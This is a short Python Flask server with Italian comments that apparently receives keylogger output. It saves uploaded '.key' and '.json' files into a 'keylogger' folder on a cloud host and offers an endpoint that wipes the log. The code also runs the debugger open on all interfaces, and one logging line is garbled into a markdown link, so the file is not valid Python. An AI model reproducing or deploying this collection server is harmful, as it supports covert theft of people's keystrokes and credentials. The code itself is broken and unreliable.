from flask import Flask, request, jsonify  
from werkzeug.utils import secure_filename  
import logging  
import os  
  
app = Flask(__name__)  
  
UPLOAD_FOLDER = '/home/ec2-user/keylogger'  
ALLOWED_EXTENSIONS = {'key', 'json'}  
  
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER  
  
def allowed_file(filename):  
    return '.' in filename and \  
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS  
  
@app.route('/upload_log', methods=['POST'])  
def upload_log():  
    if 'file' not in request.files:  
        return 'No file part'  
  
    file = request.files['file']  
  
    if file.filename == '':  
        return 'No selected file'  
  
    if file and allowed_file(file.filename):  
        filename = secure_filename(file.filename)  
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))  
        key = filename.split('.')[0]  
  
        # Leggi il contenuto del file di log  
        with open(os.path.join(UPLOAD_FOLDER, filename), 'r') as log_file:  
            log_content = log_file.read()  
  
        # Registra la chiave nel file di log  
        [logging.info](http://logging.info)(key)  
  
        return 'File and key received successfully', 200  
    else:  
        return 'Invalid file', 400  
  
@app.route('/clear_log', methods=['POST'])  
def clear_log():  
    # Svuota il contenuto del file di log  
    with open(os.path.join(UPLOAD_FOLDER, 'log.json'), 'w') as log_file:  
        log_file.write('')  
  
    return 'Log cleared successfully', 200  
  
if __name__ == '__main__':  
    # Cambia l'indirizzo in ascolto  
    app.run(debug=True, host='0.0.0.0', port=5000)